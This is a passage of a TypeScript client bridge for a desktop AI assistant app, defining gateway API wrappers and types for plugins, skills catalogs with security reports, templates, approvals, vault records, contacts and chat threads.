
export interface ConnectorToolRun {
  ts: number;
  thread_id: string | null;
  tool: string;
  kind: string; // "composio" | "mcp"
  ok: boolean;
  error_kind: string | null; // auth | rate_limit | forbidden | unavailable | other
  duration_ms: number | null;
  summary: string | null;
}

async function electronToolRuns(limit = 50): Promise<ConnectorToolRun[]> {
  try {
    const payload = await gatewayGetJson<{ runs: ConnectorToolRun[] }>(
      `/api/tools/runs?limit=${limit}`,
    );
    return payload.runs ?? [];
  } catch {
    return [];
  }
}

// Proactive suggestion card (ADR 0011 §7) — the shared addon↔user surface.
export interface ProactivitySuggestion {
  id: number;
  scope: string; // a workspace id, or "__personal__"
  kind: string; // free-form, chosen by the supervisor (no rule catalog)
  title: string;
  body: string;
  rationale: string;
  proposed_action: string | null; // gated by approval, never auto-run
  choices: string[] | null; // quick-reply options for a question card (Fix 2)
  status: string; // pending | accepted | dismissed | snoozed
  feedback: string | null; // liked | disliked
  created_at: number;
}

export interface ProactivityScopeCount {
  scope: string;
  count: number;
}

async function electronSuggestions(
  scope?: string,
): Promise<{ suggestions: ProactivitySuggestion[]; counts: ProactivityScopeCount[] }> {
  try {
    const suffix = scope ? `?scope=${encodeURIComponent(scope)}` : "";
    const payload = await gatewayGetJson<{
      suggestions: ProactivitySuggestion[];
      counts: ProactivityScopeCount[];
    }>(`/api/suggestions${suffix}`);
    return { suggestions: payload.suggestions ?? [], counts: payload.counts ?? [] };
  } catch {
    return { suggestions: [], counts: [] };
  }
}

async function electronSuggestionAct(
  id: number,
  status: "accepted" | "dismissed" | "snoozed",
  feedback?: "liked" | "disliked",
  note?: string,
): Promise<{ ok: boolean }> {
  try {
    return await gatewayPostJson<{ ok: boolean }>(
      `/api/suggestions/${id}/act`,
      { status, feedback, note },
    );
  } catch {
    return { ok: false };
  }
}

// Manually trigger the A2 supervisor review for a scope.
async function electronProactivityReviewNow(
  scope: string,
): Promise<{ emitted: boolean; id?: number; card?: ProactivitySuggestion | null }> {
  try {
    return await gatewayPostJson("/api/proactivity/review-now", { scope });
  } catch {
    return { emitted: false };
  }
}

// Plugin/addon registry enabled-state (ADR 0011 §10-A). The backend owns the flag
// that gates both the UI (nav+panel) and the engine; detaching makes all vanish.
export interface PluginState {
  id: string;
  enabled: boolean;
}

export interface PluginSignatureView {
  algorithm: string;
  public_key: string;
  signature: string;
}

export interface PluginRegistryEntryView {
  plugin_id: string;
  version: string;
  channel: "stable" | "beta";
  min_homun_version?: string | null;
  entitlement: "free" | "paid";
  manifest_url: string;
  package_url: string;
  package_sha256: string;
  signature: PluginSignatureView;
}

export interface PluginRegistryIndexView {
  schema_version: number;
  generated_at: string;
  plugins: PluginRegistryEntryView[];
}

export interface CachedPluginRegistryView {
  schema_version: number;
  source_url?: string | null;
  registry: PluginRegistryIndexView;
}

export interface InstalledPluginPackageView {
  plugin_id: string;
  version: string;
  install_dir: string;
  package_sha256: string;
}

export interface InstalledPluginPackagesView {
  plugins: InstalledPluginPackageView[];
}

export interface PluginPackageUpdateView {
  plugin_id: string;
  installed_version: string;
  candidate: PluginRegistryEntryView;
}

export interface PluginPackageUpdatesView {
  updates: PluginPackageUpdateView[];
}

export interface TrustedPluginPublicKeysView {
  schema_version: number;
  beta_enabled: boolean;
  public_keys: string[];
}

async function electronPlugins(): Promise<PluginState[]> {
  try {
    const payload = await gatewayGetJson<{ plugins: PluginState[] }>("/api/plugins");
    return payload.plugins ?? [];
  } catch {
    return [];
  }
}

async function electronTogglePlugin(id: string): Promise<PluginState | null> {
  try {
    const r = await gatewayPostJson<{ id?: string; enabled?: boolean }>(
      `/api/plugins/${encodeURIComponent(id)}/toggle`,
      {},
    );
    return typeof r.enabled === "boolean" ? { id, enabled: r.enabled } : null;
  } catch {
    return null;
  }
}

async function electronPluginRegistryCache(): Promise<CachedPluginRegistryView | null> {
  try {
    const payload = await gatewayGetJson<{ cached: CachedPluginRegistryView | null }>(
      "/api/plugins/registry/cache",
    );
    return payload.cached ?? null;
  } catch {
    return null;
  }
}

async function electronFetchPluginRegistry(sourceUrl: string): Promise<CachedPluginRegistryView | null> {
  const payload = await gatewayPostJson<{ cached: CachedPluginRegistryView | null }>(
    "/api/plugins/registry/fetch",
    { source_url: sourceUrl },
  );
  return payload.cached ?? null;
}

async function electronInstalledPluginPackages(): Promise<InstalledPluginPackagesView> {
  try {
    return await gatewayGetJson<InstalledPluginPackagesView>("/api/plugins/packages/installed");
  } catch {
    return { plugins: [] };
  }
}

async function electronPluginPackageUpdates(): Promise<PluginPackageUpdatesView> {
  try {
    return await gatewayGetJson<PluginPackageUpdatesView>("/api/plugins/packages/updates");
  } catch {
    return { updates: [] };
  }
}

async function electronTrustedPluginPublicKeys(): Promise<TrustedPluginPublicKeysView> {
  try {
    return await gatewayGetJson<TrustedPluginPublicKeysView>("/api/plugins/trusted-keys");
  } catch {
    return { schema_version: 1, beta_enabled: false, public_keys: [] };
  }
}

async function electronSetTrustedPluginPublicKeys(
  publicKeys: string[],
  betaEnabled: boolean,
): Promise<TrustedPluginPublicKeysView> {
  return gatewayPutJson<TrustedPluginPublicKeysView>("/api/plugins/trusted-keys", {
    public_keys: publicKeys,
    beta_enabled: betaEnabled,
  });
}

async function electronInstallPluginPackageFromRegistry(input: {
  registry_entry: PluginRegistryEntryView;
  beta_enabled?: boolean;
  trusted_public_keys?: string[];
}): Promise<InstalledPluginPackagesView> {
  const payload = await gatewayPostJson<{ installed_plugins?: InstalledPluginPackagesView }>(
    "/api/plugins/packages/install-from-registry",
    {
      registry_entry: input.registry_entry,
      beta_enabled: input.beta_enabled ?? false,
      trusted_public_keys: input.trusted_public_keys ?? [],
    },
  );
  return payload.installed_plugins ?? { plugins: [] };
}

async function electronUpdatePluginPackageFromRegistry(input: {
  registry_entry: PluginRegistryEntryView;
  beta_enabled?: boolean;
  trusted_public_keys?: string[];
}): Promise<InstalledPluginPackagesView> {
  const payload = await gatewayPostJson<{ installed_plugins?: InstalledPluginPackagesView }>(
    "/api/plugins/packages/update-from-registry",
    {
      registry_entry: input.registry_entry,
      beta_enabled: input.beta_enabled ?? false,
      trusted_public_keys: input.trusted_public_keys ?? [],
    },
  );
  return payload.installed_plugins ?? { plugins: [] };
}

async function electronComposioDisconnect(id: string): Promise<void> {
  const response = await fetch(
    `${DESKTOP_GATEWAY_URL}/api/capabilities/composio/connections/${encodeURIComponent(id)}`,
    { method: "DELETE", headers: gatewayHeaders() },
  );
  if (!response.ok) {
    throw new Error(`Desktop Gateway composio disconnect HTTP ${response.status}`);
  }
}

export interface SkillsSummary {
  id: string;
  name: string;
  description: string;
  enabled: boolean;
  source: string;
  version?: string;
  license?: string;
  allowed_tools?: string[];
}

export interface SkillssResponse {
  skills: SkillsSummary[];
  dir: string;
}

export interface SkillsFileNode {
  name: string;
  path: string;
  is_dir: boolean;
  children?: SkillsFileNode[];
}

export interface SkillsSecurityWarning {
  severity: "critical" | "warning";
  category: string;
  description: string;
  file?: string;
  line?: number;
}

export interface SkillsSecurityReport {
  risk_score: number;
  blocked: boolean;
  scanned_files: number;
  warnings: SkillsSecurityWarning[];
}

export interface SkillsDetail extends SkillsSummary {
  body: string;
  files: SkillsFileNode[];
  security?: SkillsSecurityReport;
}

async function electronSkillss(): Promise<SkillssResponse> {
  return gatewayGetJson<SkillssResponse>("/api/skills");
}

async function electronSkillsDetail(id: string): Promise<SkillsDetail> {
  return gatewayGetJson<SkillsDetail>(`/api/skills/${encodeURIComponent(id)}`);
}

async function electronSetSkillsEnabled(
  id: string,
  enabled: boolean,
): Promise<SkillssResponse> {
  return gatewayPostJson<SkillssResponse>(
    `/api/skills/${encodeURIComponent(id)}/enabled`,
    { enabled },
  );
}

export interface CatalogSkills {
  slug: string;
  name: string;
  description: string;
  downloads: number;
  stars: number;
  category: string;
}

export interface CatalogCategory {
  name: string;
  count: number;
}

export interface SkillsCatalogResponse {
  skills: CatalogSkills[];
  categories: CatalogCategory[];
  repo: string;
  total: number;
  fetched_at: number;
}

export interface TemplateCatalogEntry {
  provider: string;
  id: string;
  name: string;
  kind: "presentation" | "document";
  description: string;
  use_cases: string[];
  audience: string[];
  design_template: string;
  design_theme: string | null;
  design_profile: string | null;
  design_components: string[];
  layout_archetypes: string[];
  tags: string[];
  selection_notes: string[];
  preview_ref: string | null;
  source_ref: string | null;
  license: string | null;
  source_provider: string | null;
  attribution_required: boolean;
  attribution_text: string | null;
  redistribution_policy: string | null;
  is_imported: boolean;
  name_it: string | null;
  description_it: string | null;
  preview_html_ref: string | null;
  intake_questions: string[];
}

export interface TemplateCatalogResponse {
  templates: TemplateCatalogEntry[];
}

export interface ImportPptxTemplateRequest {
  source_path: string;
  name: string;
  source_provider?: string;
  source_url?: string;
  license?: string;
  attribution_required?: boolean;
  attribution_text?: string;
  redistribution_policy?: string;
  tags?: string[];
}

export interface TemplateSourceAttachment {
  local_path: string;
  display_name: string;
  mime_type: string;
  size_bytes: number;
}

async function electronSkillsCatalog(
  query?: string,
  category?: string,
): Promise<SkillsCatalogResponse> {
  const params = new URLSearchParams();
  if (query) params.set("q", query);
  if (category) params.set("category", category);
  const qs = params.toString();
  return gatewayGetJson<SkillsCatalogResponse>(`/api/skills/catalog${qs ? `?${qs}` : ""}`);
}

async function electronTemplateCatalog(): Promise<TemplateCatalogResponse> {
  return gatewayGetJson<TemplateCatalogResponse>("/api/templates/catalog");
}

async function electronImportPptxTemplate(
  payload: ImportPptxTemplateRequest,
): Promise<TemplateCatalogEntry> {
  return gatewayPostJson<TemplateCatalogEntry>("/api/templates/import-pptx", payload);
}

async function electronTemplateSourceAttachment(
  templateId: string,
): Promise<TemplateSourceAttachment> {
  return gatewayPostJson<TemplateSourceAttachment>("/api/templates/source-attachment", {
    template_id: templateId,
  });
}

async function electronDeleteTemplate(templateId: string): Promise<TemplateCatalogResponse> {
  return gatewayPostJson<TemplateCatalogResponse>("/api/templates/delete", {
    template_id: templateId,
  });
}

function electronTemplatePreviewUrl(previewRef: string): string {
  if (previewRef.startsWith("template-pack://")) {
    return `${DESKTOP_GATEWAY_URL}/api/templates/preview?ref=${encodeURIComponent(previewRef)}`;
  }
  if (previewRef.startsWith("/api/templates/preview")) {
    return `${DESKTOP_GATEWAY_URL}${previewRef}`;
  }
  return previewRef;
}

async function electronTemplatePreviewBlobUrl(previewRef: string): Promise<string> {
  const url = electronTemplatePreviewUrl(previewRef);
  if (!url.startsWith(DESKTOP_GATEWAY_URL)) {
    return url;
  }
  const response = await fetch(url, { headers: gatewayHeaders() });
  if (!response.ok) {
    throw new Error(`Template preview unavailable: HTTP ${response.status}`);
  }
  return URL.createObjectURL(await response.blob());
}

// Fetches the pack's preview.html as text (vs. the blob-URL sibling above) so it can be
// embedded via iframe srcDoc — the live-renderer preview path needs the raw markup, not a blob.
async function electronTemplatePreviewHtml(previewRef: string): Promise<string> {
  const url = electronTemplatePreviewUrl(previewRef);
  // Live preview HTML is only ever gateway-served (template-pack:// refs). Never
  // send the bearer token to a foreign origin, and never render foreign HTML.
  if (!url.startsWith(DESKTOP_GATEWAY_URL)) {
    throw new Error("Template preview HTML must come from the local gateway.");
  }
  const response = await fetch(url, { headers: gatewayHeaders() });
  if (!response.ok) {
    throw new Error(`Template preview unavailable: HTTP ${response.status}`);
  }
  return response.text();
}

export interface CatalogPreview {
  slug: string;
  name: string;
  description: string;
  body: string;
  files: string[];
  security: SkillsSecurityReport;
}

async function electronCatalogPreview(slug: string): Promise<CatalogPreview> {
  return gatewayGetJson<CatalogPreview>(
    `/api/skills/catalog/preview?slug=${encodeURIComponent(slug)}`,
  );
}

async function electronCatalogInstall(slug: string): Promise<SkillssResponse> {
  return gatewayPostJson<SkillssResponse>("/api/skills/catalog/install", { slug });
}

export interface RegistrySkills {
  id: string;
  path: string;
  name: string;
  description: string;
  installed: boolean;
}

export interface RegistryResponse {
  repo: string;
  skills: RegistrySkills[];
  suggested: string[];
}

async function electronSkillsRegistry(repo?: string): Promise<RegistryResponse> {
  const qs = repo ? `?repo=${encodeURIComponent(repo)}` : "";
  return gatewayGetJson<RegistryResponse>(`/api/skills/registry${qs}`);
}

async function electronInstallRegistrySkills(
  repo: string,
  path: string,
): Promise<SkillssResponse> {
  return gatewayPostJson<SkillssResponse>("/api/skills/registry/install", {
    repo,
    path,
  });
}

export const coreBridge = {
  status: () => Promise.resolve(electronCoreStatus()),
  runtimeModel: () => electronRuntimeModel(),
  runtimeModels: (threadId?: string) => electronRuntimeModels(threadId),
  setRuntimeModel: (model: string) => electronSetRuntimeModel(model),
  runtimeSettings: () => electronRuntimeSettings(),
  setRuntimeSettings: (settings: Partial<RuntimeSettings>) =>
    electronSetRuntimeSettings(settings),
  timezone: () => electronTimezone(),
  setTimezone: (timezone: string | null) => electronSetTimezone(timezone),
  language: () => electronLanguage(),
  setLanguage: (language: string | null) => electronSetLanguage(language),
  setupStatus: () => electronSetupStatus(),
  validateLlm: (kind: string, baseUrl: string, apiKey: string | null) =>
    electronValidateLlm(kind, baseUrl, apiKey),
  completeSetup: () => electronCompleteSetup(),
  ollamaSetup: () => electronOllamaSetup(),
  pullModel: (model: string, onProgress: (progress: PullProgress) => void) =>
    electronPullModel(model, onProgress),
  approvalRouting: () => electronApprovelRouting(),
  setApprovelRouting: (channel: string, target: string | null) =>
    electronSetApprovelRouting(channel, target),
  channelIdentities: (channel: string) => electronChannelIdentities(channel),
  runtimeProvider: () => electronRuntimeProvider(),
  setRuntimeProvider: (input: { base_url?: string; model?: string; api_key?: string }) =>
    electronSetRuntimeProvider(input),
  providers: () => electronProviders(),
  upsertProvider: (input: UpsertProviderInput) => electronUpsertProvider(input),
  removeProvider: (id: string) => electronRemoveProvider(id),
  setProviderEnabled: (id: string, enabled: boolean) =>
    electronSetProviderEnabled(id, enabled),
  refreshProviderModels: (id: string) => electronRefreshProviderModels(id),
  setModelProfile: (input: SetModelProfileInput) => electronSetModelProfile(input),
  generateProviderProfiles: (id: string) => electronGenerateProviderProfiles(id),
  llmConcurrency: () => electronLlmConcurrency(),
  setLlmConcurrency: (override: number | null) =>
    electronSetLlmConcurrency(override),
  routingDecisions: () => electronRoutingDecisions(),
  roles: () => electronRoles(),
  setRole: (input: { role: string; provider_id?: string; model?: string }) =>
    electronSetRole(input),
  containedComputerLive: () => electronContainedComputerLive(),
  startLocalComputer: () => electronStartLocalComputer(),
  stopLocalComputer: () => electronStopLocalComputer(),
  updateInfo: () => electronUpdateInfo(),
  triggerUpdate: () => electronTriggerUpdate(),
  systemStatus: () => electronSystemStatus(),
  closeAllBrowsers: () => electronCloseAllBrowsers(),
  workspaces: () => electronWorkspaces(),
  createWorkspace: (name: string, folder: string) => electronCreateteWorkspace(name, folder),
  setWorkspaceFolder: (id: string, folder: string) => electronSetWorkspaceFolder(id, folder),
  selectWorkspace: (id: string) => electronSelectWorkspace(id),
  renameWorkspace: (id: string, name: string) => electronRenameWorkspace(id, name),
  deleteWorkspace: (id: string) => electronDeleteWorkspace(id),
  reorderWorkspaces: (orderedIds: string[]) => electronReorderWorkspaces(orderedIds),
  reorderChatThreads: (workspaceId: string, orderedIds: string[]) =>
    electronReorderChatThreads(workspaceId, orderedIds),
  listTags: () => electronListTags(),
  createTag: (name: string, color: string) => electronCreateTag(name, color),
  renameTag: (id: string, name: string) => electronRenameTag(id, name),
  setTagColor: (id: string, color: string) => electronSetTagColor(id, color),
  deleteTag: (id: string) => electronDeleteTag(id),
  assignTag: (tagId: string, entityType: TagEntityType, entityId: string) =>
    electronAssignTag(tagId, entityType, entityId),
  unassignTag: (tagId: string, entityType: TagEntityType, entityId: string) =>
    electronUnassignTag(tagId, entityType, entityId),
  tagsForEntity: (entityType: TagEntityType, entityId: string) =>
    electronTagsForEntity(entityType, entityId),
  entitiesForTag: (tagId: string) => electronEntitiesForTag(tagId),
  allTagAssignments: () => electronAllTagAssignments(),
  setWorkspacePolicy: (
    id: string,
    patch: {
      sandbox_mode?: string | null;
      approval_policy?: string | null;
      writable_roots?: string[] | null;
      skill_confirmations?: string[] | null;
    },
  ) => electronSetWorkspacePolicy(id, patch),
  projectAccess: (workspaceId: string) => electronProjectAccess(workspaceId),
  upsertProjectAccess: (workspaceId: string, input: ProjectAccessInput) =>
    electronUpsertProjectAccess(workspaceId, input),
  removeProjectAccess: (workspaceId: string, contactReference: string, channel: string) =>
    electronRemoveProjectAccess(workspaceId, contactReference, channel),
  memorySources: (workspaceId: string) => electronMemorySources(workspaceId),
  memorySourceCandidates: (
    workspaceId: string,
    sourceWorkspaceId: string,
    pagination?: MemorySourceCandidatePagination,
  ) => electronMemorySourceCandidates(workspaceId, sourceWorkspaceId, pagination),
  upsertMemorySource: (workspaceId: string, input: MemorySourceUpsertInput) =>
    electronUpsertMemorySource(workspaceId, input),
  revokeMemorySource: (workspaceId: string, grantId: string) =>
    electronRevokeMemorySource(workspaceId, grantId),
  mcpConnect: (input: {
    name: string;
    command?: string;
    args?: string[];
    env?: Record<string, string>;
    url?: string;
    headers?: Record<string, string>;
  }) => electronMcpConnect(input),
  mcpRegistry: (q?: string) => electronMcpRegistry(q),
  mcpConnected: () => electronMcpConnected(),
  mcpDisconnect: (providerId: string) => electronMcpDisconnect(providerId),
  composioConnect: (apiKey: string) => electronComposioConnect(apiKey),
  composioToolkits: () => electronComposioToolkits(),
  composioToolkitAuth: (slug: string) => electronComposioToolkitAuth(slug),
  composioLink: (toolkitSlug: string, input?: ComposioLinkInput) =>
    electronComposioLink(toolkitSlug, input),
  composioConnections: () => electronComposioConnections(),
  toolRuns: (limit?: number) => electronToolRuns(limit),
  suggestions: (scope?: string) => electronSuggestions(scope),
  suggestionAct: (
    id: number,
    status: "accepted" | "dismissed" | "snoozed",
    feedback?: "liked" | "disliked",
    note?: string,
  ) => electronSuggestionAct(id, status, feedback, note),
  proactivityReviewNow: (scope: string) => electronProactivityReviewNow(scope),
  plugins: () => electronPlugins(),
  togglePlugin: (id: string) => electronTogglePlugin(id),
  pluginRegistryCache: () => electronPluginRegistryCache(),
  fetchPluginRegistry: (sourceUrl: string) => electronFetchPluginRegistry(sourceUrl),
  installedPluginPackages: () => electronInstalledPluginPackages(),
  pluginPackageUpdates: () => electronPluginPackageUpdates(),
  trustedPluginPublicKeys: () => electronTrustedPluginPublicKeys(),
  setTrustedPluginPublicKeys: (publicKeys: string[], betaEnabled: boolean) =>
    electronSetTrustedPluginPublicKeys(publicKeys, betaEnabled),
  installPluginPackageFromRegistry: (input: {
    registry_entry: PluginRegistryEntryView;
    beta_enabled?: boolean;
    trusted_public_keys?: string[];
  }) => electronInstallPluginPackageFromRegistry(input),
  updatePluginPackageFromRegistry: (input: {
    registry_entry: PluginRegistryEntryView;
    beta_enabled?: boolean;
    trusted_public_keys?: string[];
  }) => electronUpdatePluginPackageFromRegistry(input),
  composioDisconnect: (id: string) => electronComposioDisconnect(id),
  composioExecute: (
    tool: string,
    args: unknown,
    scope: "once" | "always",
    ctx?: { threadId?: string; messageId?: string },
  ) => electronComposioExecute(tool, args, scope, ctx),
  mcpExecute: (
    tool: string,
    args: unknown,
    scope: "once" | "always",
    ctx?: { threadId?: string; messageId?: string },
  ) => electronMcpExecute(tool, args, scope, ctx),
  fsAuthorize: (
    path: string,
    op: string,
    ctx?: { threadId?: string; messageId?: string },
  ) => electronFsAuthorize(path, op, ctx),
  runEscalate: (
    command: string,
    cwd: string,
    ctx?: { threadId?: string; messageId?: string },
  ) => electronRunEscalate(command, cwd, ctx),
  vaultProposalAccept: (input: VaultProposalActionInput) =>
    electronVaultProposalAccept(input),
  vaultProposalDismiss: (input: VaultProposalActionInput) =>
    electronVaultProposalDismiss(input),
  vaultRecords: () => electronVaultRecords(),
  vaultRecordDelete: (id: string) => electronVaultRecordDelete(id),
  vaultRecordUpdate: (id: string, input: VaultRecordUpdateInput) => electronVaultRecordUpdate(id, input),
  vaultRecordReveal: (id: string, pin: string) => electronVaultRecordReveal(id, pin),
  vaultPinStatus: () => electronVaultPinStatus(),
  vaultPinSetup: (pin: string, currentPin?: string) =>
    electronVaultPinSetup(pin, currentPin),
  vaultPinVerify: (pin: string) => electronVaultPinVerify(pin),
  vaultPaymentApprovalApprove: (
    snapshot: PaymentApprovalSnapshot,
    pin: string,
    cvv: string,
    ctx?: { threadId?: string; messageId?: string },
  ) => electronVaultPaymentApprovalApprove(snapshot, pin, cvv, ctx),
  connectMark: (input: {
    kind: string;
    ref: string;
    ctx?: { threadId?: string; messageId?: string };
  }) => electronConnectMark(input),
  composioAllowedTools: () => electronComposioAllowedTools(),
  composioRevokeTool: (slug: string) => electronComposioRevokeTool(slug),
  skills: () => electronSkillss(),
  skillDetail: (id: string) => electronSkillsDetail(id),
  setSkillsEnabled: (id: string, enabled: boolean) => electronSetSkillsEnabled(id, enabled),
  skillRegistry: (repo?: string) => electronSkillsRegistry(repo),
  installRegistrySkills: (repo: string, path: string) =>
    electronInstallRegistrySkills(repo, path),
  skillCatalog: (query?: string, category?: string) => electronSkillsCatalog(query, category),
  templateCatalog: () => electronTemplateCatalog(),
  importPptxTemplate: (payload: ImportPptxTemplateRequest) =>
    electronImportPptxTemplate(payload),
  templateSourceAttachment: (templateId: string) =>
    electronTemplateSourceAttachment(templateId),
  deleteTemplate: (templateId: string) => electronDeleteTemplate(templateId),
  templatePreviewUrl: (previewRef: string) => electronTemplatePreviewUrl(previewRef),
  templatePreviewBlobUrl: (previewRef: string) =>
    electronTemplatePreviewBlobUrl(previewRef),
  templatePreviewHtml: (previewRef: string) => electronTemplatePreviewHtml(previewRef),
  catalogPreview: (slug: string) => electronCatalogPreview(slug),
  catalogInstall: (slug: string) => electronCatalogInstall(slug),
  chatThreads: (workspace?: string) => chatApi.chatThreads(workspace),
  chatMessages: (threadId: string) => chatApi.chatMessages(threadId),
  setChatMessageFeedback: (
    threadId: string,
    messageId: string,
    feedback: "useful" | "not_useful" | null,
  ) => chatApi.setChatMessageFeedback(threadId, messageId, feedback),
  saveChatMessageToMemory: (threadId: string, messageId: string) =>
    chatApi.saveChatMessageToMemory(threadId, messageId),
  createTaskFromChatMessage: (threadId: string, messageId: string) =>
    chatApi.createTaskFromChatMessage(threadId, messageId),
  submitOperationalPrompt: (
    threadId: string,
    message: OperationalPromptMessageInput,
  ) => chatApi.submitOperationalPrompt(threadId, message),
  createAutomationFromChatMessage: (threadId: string, messageId: string) =>
    chatApi.createAutomationFromChatMessage(threadId, messageId),
  selectChatThread: (threadId: string) => chatApi.selectChatThread(threadId),
  createChatThread: (workspace?: string) => chatApi.createChatThread(workspace),
  seedAssistantMessage: (threadId: string, text: string, eventParts?: unknown[]) =>
    chatApi.seedAssistantMessage(threadId, text, eventParts),
  captureProactiveAnswer: (
    threadId: string,
    body: { answer: string; question: string; ack: string },
  ) => chatApi.captureProactiveAnswer(threadId, body),
  automations: (workspaceId?: string | null) => electronAutomations(workspaceId),
  activeStreams: () => electronActiveStreams(),
  automationEventSources: () => electronAutomationEventSources(),
  createAutomation: (input: AutomationCreateteInput) => electronCreateteAutomation(input),
  updateAutomation: (
    id: string,
    input: Partial<AutomationCreateteInput>,
    workspaceId?: string | null,
  ) => electronUpdateAutomation(id, input, workspaceId),
  toggleAutomation: (id: string, workspaceId?: string | null) =>
    electronToggleAutomation(id, workspaceId),
  deleteAutomation: (id: string, workspaceId?: string | null) =>
    electronDeleteAutomation(id, workspaceId),
  automationRuns: (id: string) => electronAutomationRuns(id),
  brandKit: () => electronBrandKit(),
  saveBrandKit: (kit: BrandKit) => electronSaveBrandKit(kit),
  setChatThreadPinned: (threadId: string, pinned: boolean) =>
    chatApi.setChatThreadPinned(threadId, pinned),
  renameChatThread: (threadId: string, title: string) =>
    chatApi.renameChatThread(threadId, title),
  archiveChatThread: (threadId: string) =>
    chatApi.archiveChatThread(threadId),
  unarchiveChatThread: (threadId: string) =>
    chatApi.unarchiveChatThread(threadId),
  deleteChatThread: (threadId: string) => chatApi.deleteChatThread(threadId),
  taskQueue: (threadId?: string) => electronTaskQueue(threadId),
  taskExecutorStatus: () => electronTaskExecutorStatus(),
  taskDetail: (taskId: string) => electronTaskDetail(taskId),
  approveApprovel: (approvalId: string, options?: ApprovelDecisionOptions) =>
    electronApproveApprovel(approvalId, options),
  rejectApprovel: (approvalId: string, reason: string) =>
    electronRejectApprovel(approvalId, reason),
  memoryDashboard: () => electronMemoryDashboard(),
  exportLocalData: () => electronExportLocalData(),
  memoryItems: () => electronMemoryItems(),
  projectGoals: (threadId: string) => electronProjectGoals(threadId),
  projectBriefing: (threadId: string) => electronProjectBriefing(threadId),
  suggestGoals: (threadId: string) => electronSuggestGoals(threadId),
  promoteGoals: (workspace: string, refs: string[]) => electronPromoteGoals(workspace, refs),
  addGoal: (workspace: string, text: string) => electronAddGoal(workspace, text),
  ensureProjectGraph: (workspace: string, subpath?: string) =>
    electronEnsureProjectGraph(workspace, subpath),
  projectGraphSubdirs: (workspace: string) => electronProjectGraphSubdirs(workspace),
  decideMemory: (
    reference: string,
    action: "confirm" | "reject" | "delete" | "edit",
    text?: string,
  ) => electronDecideMemory(reference, action, text),
  whatsappStatus: () => electronWhatsAppStatus(),
  whatsappConnect: (phone?: string) => electronWhatsAppConnect(phone),
  whatsappDisconnect: () => electronWhatsAppDisconnect(),
  telegramStatus: () => electronTelegramStatus(),
  telegramConnect: (token?: string) => electronTelegramConnect(token),
  telegramDisconnect: () => electronTelegramDisconnect(),
  channelSettings: () => electronChannelSettings(),
  setChannelSettings: (settings: CoreChannelSettings) => electronSetChannelSettings(settings),
  contacts: () => electronContacts(),
  contactMemories: (reference: string) => electronContactMemories(reference),
  contactProfile: (reference: string) => electronContactProfile(reference),
  refreshContactProfile: (reference: string) => electronRefreshContactProfile(reference),
  updateContact: (update: {
    reference: string;
    name?: string;
    contact_type?: string;
    notes?: string;
    soul_md?: string;
    tone_of_voice?: string;
    persona_instructions?: string;
    response_mode?: string;
    birthday?: string;
  }) => electronUpdateContact(update),
  contactPerimeter: (reference: string) => electronContactPerimeter(reference),
  setContactPerimeter: (reference: string, perimeter: CoreContactPerimeter) =>
    electronSetContactPerimeter(reference, perimeter),
  profiles: () => electronProfiles(),
  createProfile: (input: { name: string; tone_of_voice?: string; instructions?: string }) =>
    contactsPost<CoreProfile>("/api/profiles/create", input),
  updateProfile: (input: { id: number; name?: string; tone_of_voice?: string; instructions?: string }) =>
    contactsPost<CoreProfile>("/api/profiles/update", input),
  deleteProfile: (id: number) => contactsPost<{ ok: boolean }>("/api/profiles/delete", { id }),
  assignContactProfile: (reference: string, profileId: number | null, channel?: string) =>
    contactsPost<CoreContact>("/api/memory/contacts/assign-profile", {
      reference,
      ...(profileId !== null ? { profile_id: profileId } : {}),
      ...(channel ? { channel } : {}),
    }),
  contactRelationships: (reference: string) =>
    contactsPost<CoreRelationship[]>("/api/memory/contacts/relationships", { reference }),
  addRelationship: (reference: string, otherReference: string, relationshipType: string) =>
    contactsPost<{ ok: boolean }>("/api/memory/contacts/relationships/add", {
      reference,
      other_reference: otherReference,
      relationship_type: relationshipType,
    }),
  removeRelationship: (id: number) =>
    contactsPost<{ ok: boolean }>("/api/memory/contacts/relationships/remove", { id }),
  mergeContacts: (from: string, into: string) => electronMergeContacts(from, into),
  createContact: (input: {
    name: string;
    contact_type?: string;
    channel?: string;
    identifier?: string;
  }) => electronCreateteContact(input),
  deleteContact: (reference: string) => electronDeleteContact(reference),
  capabilities: () => electronCapabilities(),
  localComputerSession: (sessionId: string) =>
    electronLocalComputerSession(sessionId),
  localComputerArtifactPreview: (sessionId: string, artifactId: string) =>
    electronLocalComputerArtifactPreview(sessionId, artifactId),
  runLocalComputerSmokeTest: (sessionId: string) =>
    Promise.resolve(browserComputerSession(sessionId, 0)),
  requestLocalComputerTakeover: (sessionId: string) =>
    Promise.resolve(browserComputerSession(sessionId, 0)),
  pauseLocalComputerSession: (sessionId: string) =>
    Promise.resolve(browserComputerSession(sessionId, 0)),
  resumeLocalComputerSession: (sessionId: string) =>
    Promise.resolve(browserComputerSession(sessionId, 0)),
  submitChatPromptStream: (
    requestId: string,
    threadId: string,
    sessionId: string,
    prompt: string,
    attachments: ChatAttachmentInput[] = [],
    visiblePrompt?: string,
    model?: string,
    images?: string[],
    mode?: string,
    branchFromId?: string | null,
  ) =>
    submitBrowserRuntimeChatPromptStream(
      requestId,
      threadId,
      sessionId,
      prompt,
      visiblePrompt,
      undefined,
      undefined,
      model,
      images,
      attachments,
      mode,
      branchFromId,
    ),
  // Regenerate an answer as a persisted SIBLING branch under its user message.
  // `context` is the history up to (and including) that user message, excluding
  // the answer being replaced.
  regenerateChatPromptStream: (
    requestId: string,
    threadId: string,
    sessionId: string,
    userText: string,
    userMessageId: string,
    context: Array<{ role: "user" | "assistant"; text: string }>,
    model?: string,
  ) =>
    submitBrowserRuntimeChatPromptStream(
      requestId,
      threadId,
      sessionId,
      userText,
      undefined,
      undefined,
      undefined,
      model,
      undefined,
      [],
      undefined,
      undefined,
      userMessageId,
      context,
    ),
  chatBranches: (threadId: string) => chatApi.chatBranches(threadId),
  setActiveLeaf: (threadId: string, leafId: string | null) =>
    chatApi.setActiveLeaf(threadId, leafId),
  setBranchLabel: (threadId: string, messageId: string, label: string | null) =>
    chatApi.setBranchLabel(threadId, messageId, label),
  improvePrompt: (prompt: string) => electronImprovePrompt(prompt),
  chatSuggestions: (prompt: string, answer: string) =>
    electronChatSuggestions(prompt, answer),
  autoTitleThread: (threadId: string, prompt: string, answer: string) =>
    electronAutoTitleThread(threadId, prompt, answer),
  resumeChatPromptStream: (
    requestId: string,
    threadId: string,
    sessionId: string,
    userText: string,
    assistantMessageId: string,
    commitResult = true,
  ) =>
    resumeBrowserRuntimeChatPromptStream(
      requestId,
      threadId,
      sessionId,
      userText,
      assistantMessageId,
      commitResult,
    ),
